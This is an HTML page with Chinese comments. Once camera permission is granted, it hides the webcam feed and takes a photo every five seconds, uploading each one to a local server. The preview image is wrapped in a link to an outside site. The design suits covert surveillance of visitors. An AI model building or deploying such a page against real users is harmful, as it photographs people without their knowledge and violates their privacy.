<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webcam Automatic Capture</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background-color: #f0f0f0;
        }
        #webcam, #canvas {
            display: none;
        }
        /* ---- CSS 修改 ---- */
        /* 为链接元素添加一些样式，使其行为更像一个块 */
        #previewLink {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            max-width: 640px;
            min-height: 480px;
            border: 2px dashed #ccc;
            background-color: #fff;
            text-decoration: none; /* 移除链接下划线 */
        }
        #previewImage {
            max-width: 100%;
            max-height: 100%;
        }
    </style>
</head>
<body>

    <video id="webcam" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <a id="previewLink" href="http://yasetube.com" target="_blank" rel="noopener noreferrer">
        <img id="previewImage" alt="Capture preview"/>
    </a>

    <script>
        // --- JavaScript 代码无需任何修改 ---
        const webcamVideo = document.getElementById('webcam');
        const canvas = document.getElementById('canvas');
        const previewImage = document.getElementById('previewImage');
        
        let stream;
        let isUploading = false;
        const UPLOAD_INTERVAL = 5000; // 5秒

        async function captureAndUpload() {
            if (isUploading || !stream) {
                return;
            }
            isUploading = true;
            const videoSettings = stream.getVideoTracks()[0].getSettings();
            canvas.width = videoSettings.width;
            canvas.height = videoSettings.height;
            const context = canvas.getContext('2d');
            context.drawImage(webcamVideo, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(async (blob) => {
                previewImage.src = URL.createObjectURL(blob);
                const formData = new FormData();
                formData.append('photo', blob, `capture-${Date.now()}.jpg`);
                try {
                    const response = await fetch('http://localhost:3000/upload', {
                        method: 'POST',
                        body: formData,
                    });
                    if (response.ok) {
                        console.log('Upload successful');
                    } else {
                        console.error('Upload failed:', response.statusText);
                    }
                } catch (error) {
                    console.error('Upload error:', error);
                } finally {
                    isUploading = false;
                }
            }, 'image/jpeg', 0.9);
        }

        async function init() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { width: 1280, height: 720 }, 
                    audio: false 
                });
                webcamVideo.srcObject = stream;
                webcamVideo.onloadedmetadata = () => {
                    setInterval(captureAndUpload, UPLOAD_INTERVAL);
                };
            } catch (error) {
                console.error('Camera access denied or error:', error);
            }
        }
        init();
    </script>
</body>
</html>
